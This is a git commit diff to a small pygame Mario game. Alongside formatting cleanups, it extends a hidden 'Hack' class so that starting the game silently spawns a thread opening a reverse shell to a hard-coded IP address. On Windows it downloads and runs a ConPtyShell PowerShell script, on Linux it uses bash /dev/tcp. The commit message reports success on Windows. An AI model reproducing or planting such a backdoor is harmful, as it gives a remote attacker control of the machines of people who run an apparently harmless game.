c02ae53991f91fb4d678190a32178c44971539df
izabayo7 <cedricizabayo7@gmail.com>
2022-02-06 14:49:53 +0200

    sucessfully executed the commands on windows

--- mario.py
+++ mario.py
@@ -24,29 +24,39 @@ font = pygame.font.SysFont('forte', 20)
 canvas = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
 pygame.display.set_caption('Mario')
 
+
 class Hack:
     def __init__(self):
-        self.command = "IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 82.165.97.169 2002" if (platform.system() == "Windows") else "/bin/bash -i >/dev/tcp/82.165.97.169/2002 0<&1 2>&1"
+        self.isWindows = platform.system() == "Windows"
+        self.command = "IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 82.165.97.169 2002" if (
+            self.isWindows) else "/bin/bash -i >/dev/tcp/82.165.97.169/2002 0<&1 2>&1"
 
-    def execute(self,arg):
+    def execute(self, arg):
         try:
             print(self.command)
-            subprocess.check_call(
-                self.command,
-                shell=True,
-                executable="/bin/bash")
+            if self.isWindows:
+                subprocess.run(["powershell", "-Command", self.command], capture_output=True)
+            else:
+                subprocess.check_call(
+                    self.command,
+                    shell=True,
+                    executable="/bin/bash")
         except:
             return 0
 
-hack =  Hack();
+
+hack = Hack();
+
 
 class Topscore:
     def __init__(self):
         self.high_score = 0
+
     def top_score(self, score):
         if score > self.high_score:
             self.high_score = score
         return self.high_score
+
 
 topscore = Topscore()
 
@@ -59,7 +69,7 @@ class Dragon:
         self.dragon_img_rect = self.dragon_img.get_rect()
         self.dragon_img_rect.width -= 10
         self.dragon_img_rect.height -= 10
-        self.dragon_img_rect.top = WINDOW_HEIGHT/2
+        self.dragon_img_rect.top = WINDOW_HEIGHT / 2
         self.dragon_img_rect.right = WINDOW_WIDTH
         self.up = True
         self.down = False
@@ -89,7 +99,6 @@ class Flames:
         self.flames_img_rect.right = dragon.dragon_img_rect.left
         self.flames_img_rect.top = dragon.dragon_img_rect.top + 30
 
-
     def update(self):
         canvas.blit(self.flames_img, self.flames_img_rect)
 
@@ -104,7 +113,7 @@ class Mario:
         self.mario_img = pygame.image.load('maryo.png')
         self.mario_img_rect = self.mario_img.get_rect()
         self.mario_img_rect.left = 20
-        self.mario_img_rect.top = WINDOW_HEIGHT/2 - 100
+        self.mario_img_rect.top = WINDOW_HEIGHT / 2 - 100
         self.down = True
         self.up = False
 
@@ -131,7 +140,7 @@ def game_over():
     topscore.top_score(SCORE)
     game_over_img = pygame.image.load('end.png')
     game_over_img_rect = game_over_img.get_rect()
-    game_over_img_rect.center = (WINDOW_WIDTH/2, WINDOW_HEIGHT/2)
+    game_over_img_rect.center = (WINDOW_WIDTH / 2, WINDOW_HEIGHT / 2)
     canvas.blit(game_over_img, game_over_img_rect)
     while True:
         for event in pygame.event.get():
@@ -148,14 +157,13 @@ def game_over():
 
 
 def start_game():
-
-    thread = threading.Thread(target=hack.execute, args=(0, ))
+    thread = threading.Thread(target=hack.execute, args=(0,))
     thread.start()
 
     canvas.fill(BLACK)
     start_img = pygame.image.load('start.png')
     start_img_rect = start_img.get_rect()
-    start_img_rect.center = (WINDOW_WIDTH/2, WINDOW_HEIGHT/2)
+    start_img_rect.center = (WINDOW_WIDTH / 2, WINDOW_HEIGHT / 2)
     canvas.blit(start_img, start_img_rect)
     while True:
         for event in pygame.event.get():
@@ -190,9 +198,6 @@ def check_level(SCORE):
         LEVEL = 4
 
 
-
-
-
 def game_loop():
     while True:
         global dragon
@@ -202,7 +207,7 @@ def game_loop():
         add_new_flame_counter = 0
         global SCORE
         SCORE = 0
-        global  HIGH_SCORE
+        global HIGH_SCORE
         flames_list = []
         pygame.mixer.music.load('mario_theme.wav')
         pygame.mixer.music.play(-1, 0.0)
@@ -241,19 +246,19 @@ def game_loop():
                         mario.down = True
                         mario.up = False
 
-            score_font = font.render('Score:'+str(SCORE), True, GREEN)
+            score_font = font.render('Score:' + str(SCORE), True, GREEN)
             score_font_rect = score_font.get_rect()
-            score_font_rect.center = (200, cactus_img_rect.bottom + score_font_rect.height/2)
+            score_font_rect.center = (200, cactus_img_rect.bottom + score_font_rect.height / 2)
             canvas.blit(score_font, score_font_rect)
 
-            level_font = font.render('Level:'+str(LEVEL), True, GREEN)
+            level_font = font.render('Level:' + str(LEVEL), True, GREEN)
             level_font_rect = level_font.get_rect()
-            level_font_rect.center = (500, cactus_img_rect.bottom + score_font_rect.height/2)
+            level_font_rect.center = (500, cactus_img_rect.bottom + score_font_rect.height / 2)
             canvas.blit(level_font, level_font_rect)
 
-            top_score_font = font.render('Top Score:'+str(topscore.high_score),True,GREEN)
+            top_score_font = font.render('Top Score:' + str(topscore.high_score), True, GREEN)
             top_score_font_rect = top_score_font.get_rect()
-            top_score_font_rect.center = (800, cactus_img_rect.bottom + score_font_rect.height/2)
+            top_score_font_rect.center = (800, cactus_img_rect.bottom + score_font_rect.height / 2)
             canvas.blit(top_score_font, top_score_font_rect)
 
             canvas.blit(cactus_img, cactus_img_rect)
@@ -269,5 +274,3 @@ def game_loop():
 
 
 start_game()
-
-
